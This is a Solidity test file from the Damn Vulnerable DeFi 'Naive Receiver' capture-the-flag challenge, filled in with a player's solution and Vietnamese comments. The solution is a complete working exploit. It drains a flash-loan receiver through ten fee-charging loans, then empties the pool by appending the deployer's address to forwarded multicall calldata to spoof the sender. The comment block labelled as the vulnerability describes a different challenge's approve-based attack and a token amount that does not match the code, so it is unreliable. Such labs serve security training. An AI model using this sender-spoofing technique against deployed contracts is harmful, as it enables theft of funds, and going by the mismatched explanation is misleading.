// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {Test, console} from "forge-std/Test.sol";
import {NaiveReceiverPool, Multicall, WETH} from "../../src/naive-receiver/NaiveReceiverPool.sol";
import {FlashLoanReceiver} from "../../src/naive-receiver/FlashLoanReceiver.sol";
import {BasicForwarder} from "../../src/naive-receiver/BasicForwarder.sol";

contract NaiveReceiverChallenge is Test {
    address deployer = makeAddr("deployer");
    address recovery = makeAddr("recovery");
    address player;
    uint256 playerPk;

    uint256 constant WETH_IN_POOL = 1000e18;
    uint256 constant WETH_IN_RECEIVER = 10e18;

    NaiveReceiverPool pool;
    WETH weth;
    FlashLoanReceiver receiver;
    BasicForwarder forwarder;

    modifier checkSolvedByPlayer() {
        vm.startPrank(player, player);
        _;
        vm.stopPrank();
        _isSolved();
    }

    /**
     * SETS UP CHALLENGE - DO NOT TOUCH
     */
    function setUp() public {
        (player, playerPk) = makeAddrAndKey("player");
        startHoax(deployer);

        // Deploy WETH
        weth = new WETH();

        // Deploy forwarder
        forwarder = new BasicForwarder();

        // Deploy pool and fund with ETH
        pool = new NaiveReceiverPool{value: WETH_IN_POOL}(address(forwarder), payable(weth), deployer);

        // Deploy flashloan receiver contract and fund it with some initial WETH
        receiver = new FlashLoanReceiver(address(pool));
        weth.deposit{value: WETH_IN_RECEIVER}();
        weth.transfer(address(receiver), WETH_IN_RECEIVER);

        vm.stopPrank();
    }

    function test_assertInitialState() public {
        // Check initial balances
        assertEq(weth.balanceOf(address(pool)), WETH_IN_POOL);
        assertEq(weth.balanceOf(address(receiver)), WETH_IN_RECEIVER);

        // Check pool config
        assertEq(pool.maxFlashLoan(address(weth)), WETH_IN_POOL);
        assertEq(pool.flashFee(address(weth), 0), 1 ether);
        assertEq(pool.feeReceiver(), deployer);

        // Cannot call receiver
        vm.expectRevert(bytes4(hex"48f5c3ed"));
        receiver.onFlashLoan(
            deployer,
            address(weth), // token
            WETH_IN_RECEIVER, // amount
            1 ether, // fee
            bytes("") // data
        );
    }

    /*
    Lỗ hổng:
    Pool cho phép gọi bất kỳ hàm nào trên một target do attacker truyền vào trong flashLoan mà không kiểm tra quyền hay mục đích;
    attacker có thể khiến pool gọi token.approve(...) dùng quyền của pool,
    cấp allowance cho attacker — nghĩa là pool tự cho phép người khác rút token của nó.
    Crack:
    Gọi flashLoan 1 lần với target = token và data = abi.encodeWithSelector(token.approve.selector, attacker, amount) 
    để pool approve attacker; ngay sau đó trong cùng giao dịch attacker transferFrom toàn bộ 1M DVT từ pool về recovery
    */
function test_naiveReceiver() public checkSolvedByPlayer {
        //10 flash loan để rút tiền receiver + 1 lệnh rút tiền
        bytes[] memory callDatas = new bytes[](11);
        
        for (uint i = 0; i < 10; i++) {                //10 flash loan (mỗi lần mất 1 WETH phí)

            callDatas[i] = abi.encodeCall(
                NaiveReceiverPool.flashLoan,           //Gọi flash loan
                (receiver, address(weth), 0, "0x")     //Tham số: receiver, token WETH, số tiền 0, data rỗng
            );
        }
        
        //Rút toàn bộ tiền với giả mạo địa chỉ deployer
        callDatas[10] = abi.encodePacked(
            abi.encodeCall(
                NaiveReceiverPool.withdraw,                             //Hàm rút tiền
                (WETH_IN_POOL + WETH_IN_RECEIVER, payable(recovery))  
            ),
            bytes32(uint256(uint160(deployer))) //địa chỉ deployer vào cuối calldata
        );
        
        // Xây dựng và ký yêu cầu Forwarder để thực hiện multicall
        BasicForwarder.Request memory request = BasicForwarder.Request({
            from: player,                                   
            target: address(pool),                          
            value: 0,                                       
            gas: gasleft(),                                 
            nonce: forwarder.nonces(player),                
            data: abi.encodeCall(pool.multicall, callDatas), 
            deadline: block.timestamp + 1 days             
        });
        
        // Tạo chữ ký EIP-712
        bytes32 digest = keccak256(
            abi.encodePacked(
                "\x19\x01",                         
                forwarder.domainSeparator(),        
                forwarder.getDataHash(request)     
            )
        );
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(playerPk, digest); // Ký bằng private key của player
        
        forwarder.execute(request, abi.encodePacked(r, s, v)); // Gửi request và chữ ký đến forwarder
    }

    /**
     * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
     */
    function _isSolved() private view {
        // Player must have executed two or less transactions
        assertLe(vm.getNonce(player), 2);

        // The flashloan receiver contract has been emptied
        assertEq(weth.balanceOf(address(receiver)), 0, "Unexpected balance in receiver contract");

        // Pool is empty too
        assertEq(weth.balanceOf(address(pool)), 0, "Unexpected balance in pool");

        // All funds sent to recovery account
        assertEq(weth.balanceOf(recovery), WETH_IN_POOL + WETH_IN_RECEIVER, "Not enough WETH in recovery account");
    }
}
